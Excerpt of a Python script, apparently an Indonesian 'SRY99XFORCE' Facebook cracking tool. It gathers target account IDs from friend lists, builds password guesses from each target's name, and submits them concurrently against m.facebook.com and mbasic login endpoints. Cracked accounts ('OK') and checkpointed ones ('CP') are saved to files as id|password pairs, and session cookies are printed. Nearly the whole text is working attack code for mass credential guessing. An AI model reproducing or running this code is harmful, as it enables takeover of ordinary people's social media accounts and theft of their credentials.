def author(pm_aink):
	...
	time.sleep(3)
	os.system("xdg-open https://www.facebook.com/Ogenki Desuka")
	back()
# * [ WARNA BENGET SIA ] * #
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
...
# * [ PENYIMPAN FILE ] * #
sry99_ok = 'SRY99_OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
sry99_cp = 'SRY99_CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# * [ BANNER KUMAHA AINK ] * #
def ___raka_ganteng___():
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	clear()
	__raka_andrian___('''\033[31m___  ____ _ _  _ ____ ___ ____ ____ ___  
|__] |__/ | |  | |__|  |  |___ |___ |__] 
\033[0m|    |  \ |  \/  |  |  |  |___ |    |__]  \033[32m\033[0m
INFO AUTHOR : SRY99XFORCE
...
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
		ses = requests.Session()
		__raka_andrian___(f'{K} [{P}•{K}]{P} Gunakan Cookies Janda Pirang...?')
		...
		with requests.Session() as r:
			try:
				...
				__raka_andrian___(f"{K} [{P}•{K}]{P} Cookies Kadaluarsa Kawan ...")
...
def menu(name):
	try:
		...
		__raka_andrian___(f'{K} [{P}•{K}]{P} Cookies Kadaluarsa kea dupir ')
		time.sleep(3)
		gafi_login()
	os.system('clear')
	___raka_ganteng___()
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	...
	if _raka_andrian_tara_ in ['01','1']:
		...
		print(f'{x}____________________________________________')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		__raka_andrian___(f'{K} [{P}•{K}]{P} Succes Menghapus Cookie Good Bay...')
		time.sleep(3)
		exit()
	else:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Pilih Yang Benar Kawan...?')
		time.sleep(4)
		back()
# * [ CRACK PUBLIK ] * #
def crack_publik():
...
def crack_massal():
	...
	if cuma_aa_raka<1 or cuma_aa_raka>100:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Pertemanan Privat Kawan...? ')
		exit()
	ses=requests.Session()
	raka66 = 0
...
def perintah():
	...
	print('')
	__raka_andrian___(f'{K} [{P}•{K}]{P} Async Ketik ({K}1{P}) Untuk Mulai Crack [Recomended]')
	__raka_andrian___(f'{K} [{P}•{K}]{P} Reguler Ketik ({K}2{P}) Untuk Mulai Crack [Very Recommended]')
	__raka_andrian___(f'{K} [{P}•{K}]{P} Validate Ketik ({K}3{P}) Untuk Mulai Crack [Very Recommended]')
	...
	if ____method_crack____ in ['1',]:
		...
		rakaxxx.append('mbasic')
		print('')
	elif ____method_crack____ in ['']:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Pilih Yang Bener Kawan ')
		perintah()
	else:
		rakaxxx.append('async')
	seting_password()
			...
			for kocak_euy in id2:
				...
				if len(nmf)<6:
					if len(frs)<6:
						...
						afa_aja_boleh.append(frs+'098')
						afa_aja_boleh.append(frs+'123321')
				else:
					if len(frs)<6:
				...
				if 'async' in rakaxxx:
					...
					rakaANDRIAN.submit(reguler,idf,afa_aja_boleh,'m.facebook.com')
				elif 'mbasic' in rakaxxx:
					rakaANDRIAN.submit(mbasic,idf,afa_aja_boleh)
				else:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
		print('')
		print(f'{K} [{P}•{K}]{P} Hasil : %s\n{K} [{P}•{K}]{P} Hasil : %s'%(sry99_ok,sry99_cp))
		print('')
		print(f'{K} [{P}•{K}]{P} SRY99_OK : {H}%s '%(ok))
		print(f'{K} [{P}•{K}]{P} SRY99_CP : {K}%s '%(cp))
		print('')
# * [ METHODE NGOCOK ] * #
	...
	for pw in afa_aja_boleh:
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f' {P}[{K}SRY99 CP{P}] {K}{idf}|{pw}')
				open('SRY99_CP/'+sry99_cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f' {P}[{H}SRY99 OK{P}] {H}{idf}|{pw}\n{kuki}')
				open('SRY99_OK/'+sry99_ok,'a').write(idf+'|'+pw+'\n')
				break
			else:continue
